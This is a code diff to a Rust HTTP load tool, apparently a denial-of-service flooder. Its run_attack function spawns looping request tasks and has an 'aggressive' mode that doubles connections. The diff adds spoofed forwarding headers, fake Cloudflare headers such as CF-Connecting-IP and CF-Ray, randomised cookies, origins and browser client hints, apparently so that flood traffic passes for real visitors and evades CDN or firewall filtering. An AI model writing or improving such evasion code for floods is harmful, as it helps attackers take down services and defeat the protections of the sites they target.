@@ -67,6 +67,9 @@ pub async fn run_attack(config: AttackConfig) {
         let post_data = config.post_data.clone();
         let user_agent = config.user_agent.clone();
         let mode = config.mode.clone();
+        let target_host = config.target.clone();
+        let target_port = config.port;
+        let is_https = config.https;
         
         let task = tokio::spawn(async move {
             loop {
@@ -113,7 +116,19 @@ pub async fn run_attack(config: AttackConfig) {
                         .header("Referer", get_random_referer())
                         .header("X-Forwarded-For", generate_random_ip())
                         .header("X-Real-IP", generate_random_ip())
-                        .header("X-Requested-With", "XMLHttpRequest");
+                        .header("X-Forwarded-Proto", if is_https { "https" } else { "http" })
+                        .header("X-Forwarded-Host", &target_host)
+                        .header("X-Forwarded-Port", target_port.to_string())
+                        .header("CF-Connecting-IP", generate_random_ip())
+                        .header("CF-IPCountry", get_random_country_code())
+                        .header("CF-Visitor", "{\"scheme\":\"https\"}")
+                        .header("CF-Ray", generate_random_cf_ray())
+                        .header("CF-Device-Type", get_random_device_type())
+                        .header("Cookie", generate_random_cookies())
+                        .header("Origin", get_random_origin())
+                        .header("Sec-Ch-Ua", get_random_sec_ch_ua())
+                        .header("Sec-Ch-Ua-Mobile", "?0")
+                        .header("Sec-Ch-Ua-Platform", get_random_platform());
                 }
 
                 match request_builder.send().await {
@@ -308,4 +323,106 @@ fn adjust_connections_by_mode(base_connections: usize, mode: &str) -> usize {
         "aggressive" => (base_connections as f64 * 2.0) as usize, // 增加100%
         _ => base_connections,
     }
+}
+
+// 生成随机Cookie
+fn generate_random_cookies() -> String {
+    let mut rng = rand::thread_rng();
+    let cookies = [
+        "session_id=abc123; path=/",
+        "user_id=12345; path=/",
+        "theme=dark; path=/",
+        "language=zh-CN; path=/",
+        "timezone=Asia/Shanghai; path=/",
+        "preferences=default; path=/",
+        "analytics=1; path=/",
+        "marketing=1; path=/",
+        "gdpr=1; path=/",
+        "consent=all; path=/",
+    ];
+    let cookie = cookies[rng.gen_range(0..cookies.len())];
+    format!("{}; _ga=GA1.2.{}.{}; _gid=GA1.2.{}.{}", 
+        cookie,
+        rng.gen_range(1000000000i64..9999999999i64),
+        rng.gen_range(1000000000i64..9999999999i64),
+        rng.gen_range(1000000000i64..9999999999i64),
+        rng.gen_range(1000000000i64..9999999999i64)
+    )
+}
+
+// 生成随机Origin
+fn get_random_origin() -> &'static str {
+    let origins = [
+        "https://www.google.com",
+        "https://www.bing.com",
+        "https://www.yahoo.com",
+        "https://www.facebook.com",
+        "https://www.twitter.com",
+        "https://www.linkedin.com",
+        "https://www.youtube.com",
+        "https://www.reddit.com",
+        "https://www.stackoverflow.com",
+        "https://www.github.com",
+        "https://www.amazon.com",
+        "https://www.ebay.com",
+        "https://www.wikipedia.org",
+        "https://www.medium.com",
+        "https://www.quora.com",
+    ];
+    origins[rand::thread_rng().gen_range(0..origins.len())]
+}
+
+// 生成随机Sec-Ch-Ua
+fn get_random_sec_ch_ua() -> &'static str {
+    let sec_ch_ua = [
+        "\"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\", \";Not A Brand\";v=\"99\"",
+        "\"Google Chrome\";v=\"92\", \"Chromium\";v=\"92\", \";Not A Brand\";v=\"99\"",
+        "\"Google Chrome\";v=\"93\", \"Chromium\";v=\"93\", \";Not A Brand\";v=\"99\"",
+        "\"Microsoft Edge\";v=\"91\", \"Chromium\";v=\"91\", \";Not A Brand\";v=\"99\"",
+        "\"Microsoft Edge\";v=\"92\", \"Chromium\";v=\"92\", \";Not A Brand\";v=\"99\"",
+        "\"Firefox\";v=\"89\"",
+        "\"Firefox\";v=\"90\"",
+        "\"Safari\";v=\"14\"",
+        "\"Safari\";v=\"15\"",
+    ];
+    sec_ch_ua[rand::thread_rng().gen_range(0..sec_ch_ua.len())]
+}
+
+// 生成随机平台
+fn get_random_platform() -> &'static str {
+    let platforms = [
+        "\"Windows\"",
+        "\"macOS\"",
+        "\"Linux\"",
+        "\"Android\"",
+        "\"iOS\"",
+    ];
+    platforms[rand::thread_rng().gen_range(0..platforms.len())]
+}
+
+// 生成随机国家代码
+fn get_random_country_code() -> &'static str {
+    let countries = [
+        "US", "CN", "JP", "DE", "GB", "FR", "CA", "AU", "BR", "IN",
+        "RU", "KR", "IT", "ES", "NL", "SE", "CH", "NO", "DK", "FI",
+    ];
+    countries[rand::thread_rng().gen_range(0..countries.len())]
+}
+
+// 生成随机CF-Ray
+fn generate_random_cf_ray() -> String {
+    let mut rng = rand::thread_rng();
+    let chars: Vec<char> = "abcdefghijklmnopqrstuvwxyz0123456789".chars().collect();
+    let ray_id: String = (0..16).map(|_| chars[rng.gen_range(0..chars.len())]).collect();
+    format!("{}-{}", ray_id, get_random_country_code())
+}
+
+// 生成随机设备类型
+fn get_random_device_type() -> &'static str {
+    let device_types = [
+        "desktop",
+        "mobile",
+        "tablet",
+    ];
+    device_types[rand::thread_rng().gen_range(0..device_types.len())]
 } 
